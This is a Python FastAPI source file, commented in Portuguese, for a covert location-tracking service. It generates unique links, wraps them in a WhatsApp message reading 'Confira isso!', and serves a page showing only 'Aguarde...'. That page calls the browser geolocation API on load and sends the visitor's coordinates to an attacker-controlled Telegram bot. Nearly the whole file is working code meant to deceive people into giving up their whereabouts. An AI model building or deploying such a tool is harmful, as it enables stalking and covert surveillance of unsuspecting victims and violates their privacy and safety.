import uuid
from fastapi import FastAPI, Form, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from dotenv import load_dotenv
from pydantic import BaseModel
import requests
import os

# Carregar o arquivo .env
load_dotenv()

# Acessar as variáveis de ambiente
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

app = FastAPI()

# Modelo de dados para a localização


class LocationData(BaseModel):
    id: str
    latitude: float
    longitude: float


# Banco de dados em memória para armazenar os links
active_links = {}

# Função para enviar mensagem para o Telegram


def send_to_telegram(message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {
        "chat_id": CHAT_ID,
        "text": message,
    }
    try:
        response = requests.post(url, data=params)
        response_data = response.json()
        if response.status_code != 200 or not response_data.get("ok"):
            print(f"Erro ao enviar mensagem para o Telegram: {response_data}")
        return response_data
    except Exception as e:
        print(f"Falha ao conectar ao Telegram: {e}")
        return {"error": str(e)}

# Servir o arquivo HTML na raiz "/"


@app.get("/")
async def serve_html():
    return FileResponse("index.html")

# Rota para receber a localização


@app.post("/send-location/")
async def send_location(location: LocationData):
    if location.id not in active_links:
        return JSONResponse(content={"error": "ID inválido"}, status_code=404)

    # Enviar localização para o Telegram
    message = f"📍 Localização recebida!\n🌍 Latitude: {location.latitude}\n📍 Longitude: {location.longitude}"
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={
                  "chat_id": CHAT_ID, "text": message})

    return {"message": "Localização enviada!"}


@app.get("/generate-link/")
async def generate_link():
    unique_id = str(uuid.uuid4())[:8]  # Gera um ID único de 8 caracteres
    # Link de rastreamento
    tracking_url = f"http://127.0.0.1:8000/track/{unique_id}"

    # Salva no "banco de dados" em memória
    active_links[unique_id] = {"status": "waiting"}

    return JSONResponse(content={"link": tracking_url})


@app.get("/track/{tracking_id}")
async def track_user(tracking_id: str, request: Request):
    if tracking_id not in active_links:
        return JSONResponse(content={"error": "Link inválido"}, status_code=404)

    # Página HTML que coleta a localização automaticamente
    html_content = f"""
    <html>
    <head>
        <script>
            function sendLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition((position) => {{
                        fetch("/send-location/", {{
                            method: "POST",
                            headers: {{"Content-Type": "application/json"}},
                            body: JSON.stringify({{
                                id: "{tracking_id}",
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            }})
                        }});
                    }});
                }}
            }}
            window.onload = sendLocation;  // Executa automaticamente
        </script>
    </head>
    <body>
        <h1>Aguarde...</h1>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)


@app.get("/send-whatsapp/")
async def send_whatsapp():
    response = await generate_link()  # Gera um link único
    tracking_url = response.body.decode("utf-8")  # Extrai a URL gerada

    # Mensagem formatada para WhatsApp
    whatsapp_link = f"https://api.whatsapp.com/send?text=Confira isso! {tracking_url}"
    return JSONResponse(content={"whatsapp_link": whatsapp_link})

# Rota para exibir o formulário de configuração


@app.get("/config")
async def config_form():
    html_content = """
    <html>
    <head><title>Configuração do Telegram Bot</title></head>
    <body>
        <h1>Configure seu bot do Telegram</h1>
        <form action="/save-config" method="post">
            <label for="telegram_token">Telegram Token:</label>
            <input type="text" id="telegram_token" name="telegram_token" required><br><br>
            <label for="chat_id">Chat ID:</label>
            <input type="text" id="chat_id" name="chat_id" required><br><br>
            <button type="submit">Salvar Configuração</button>
        </form>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# Rota para salvar as configurações no arquivo .env


@app.post("/save-config")
async def save_config(telegram_token: str = Form(...), chat_id: str = Form(...)):
    # Gravar no arquivo .env
    with open('.env', 'w') as f:
        f.write(f"TELEGRAM_TOKEN={telegram_token}\n")
        f.write(f"CHAT_ID={chat_id}\n")

    # Recarregar as variáveis de ambiente
    load_dotenv()

    return {"message": "Configuração salva com sucesso!"}
